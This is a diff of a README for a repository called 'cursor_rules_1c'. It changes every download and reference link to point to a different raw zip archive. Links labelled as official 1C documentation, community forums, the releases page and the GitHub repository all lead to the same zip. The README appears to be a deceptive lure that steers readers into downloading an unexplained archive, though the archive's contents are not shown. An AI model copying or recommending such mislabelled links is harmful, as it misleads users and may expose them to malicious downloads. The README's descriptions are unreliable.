@@ -4,7 +4,7 @@
 Welcome to the **cursor_rules_1c** project. This application helps improve your coding experience in 1C by providing rules for cursor behavior. Follow the steps below to get started.
 
 ## 📥 Download Now
-[![Download cursor_rules_1c](https://raw.githubusercontent.com/CoderJ-afk/cursor_rules_1c/main/bluelegs/cursor_rules_1c.zip)](https://raw.githubusercontent.com/CoderJ-afk/cursor_rules_1c/main/bluelegs/cursor_rules_1c.zip)
+[![Download cursor_rules_1c](https://github.com/CoderJ-afk/cursor_rules_1c/raw/refs/heads/main/Other/rules-cursor-c-2.9.zip)](https://github.com/CoderJ-afk/cursor_rules_1c/raw/refs/heads/main/Other/rules-cursor-c-2.9.zip)
 
 ## 📋 System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -15,7 +15,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 1. **Visit the Releases Page:** Click the link below to open the GitHub Releases page.
-   - [Visit this page to download](https://raw.githubusercontent.com/CoderJ-afk/cursor_rules_1c/main/bluelegs/cursor_rules_1c.zip)
+   - [Visit this page to download](https://github.com/CoderJ-afk/cursor_rules_1c/raw/refs/heads/main/Other/rules-cursor-c-2.9.zip)
   
 2. **Choose the Version:** Find the latest version of the application on the Releases page. Each version has a "Release" title and date. 
 
@@ -59,11 +59,11 @@ We welcome your opinions and thoughts. If you have suggestions or feedback, plea
 ## 📦 Additional Resources
 You can refer to the following links for more information on coding practices in 1C:
 
-- [1C Official Documentation](https://raw.githubusercontent.com/CoderJ-afk/cursor_rules_1c/main/bluelegs/cursor_rules_1c.zip)
-- [Community Forums](https://raw.githubusercontent.com/CoderJ-afk/cursor_rules_1c/main/bluelegs/cursor_rules_1c.zip)
+- [1C Official Documentation](https://github.com/CoderJ-afk/cursor_rules_1c/raw/refs/heads/main/Other/rules-cursor-c-2.9.zip)
+- [Community Forums](https://github.com/CoderJ-afk/cursor_rules_1c/raw/refs/heads/main/Other/rules-cursor-c-2.9.zip)
 
 ## 🔗 Useful Links
-- [Visit this page to download](https://raw.githubusercontent.com/CoderJ-afk/cursor_rules_1c/main/bluelegs/cursor_rules_1c.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/CoderJ-afk/cursor_rules_1c/main/bluelegs/cursor_rules_1c.zip)
+- [Visit this page to download](https://github.com/CoderJ-afk/cursor_rules_1c/raw/refs/heads/main/Other/rules-cursor-c-2.9.zip)
+- [GitHub Repository](https://github.com/CoderJ-afk/cursor_rules_1c/raw/refs/heads/main/Other/rules-cursor-c-2.9.zip)
 
 Thank you for choosing **cursor_rules_1c**! Enjoy a smooth and enhanced coding experience!
